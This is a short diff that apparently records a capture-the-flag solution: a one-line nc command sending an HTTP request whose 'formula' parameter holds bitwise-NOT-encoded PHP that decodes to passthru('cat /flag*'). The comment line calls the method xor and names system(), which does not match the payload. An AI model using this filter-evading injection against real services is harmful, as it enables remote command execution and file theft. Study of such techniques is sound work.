@@ -1,0 +1,3 @@
+xor on byte literals to form system(cat flag*)
+
+echo -e 'GET /?formula=(~(\x8f\x9e\x8c\x8c\x8b\x97\x8d\x8a))(~(\x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98\xd5)) HTTP/1.1\r\nHost: 0\r\n' | nc server
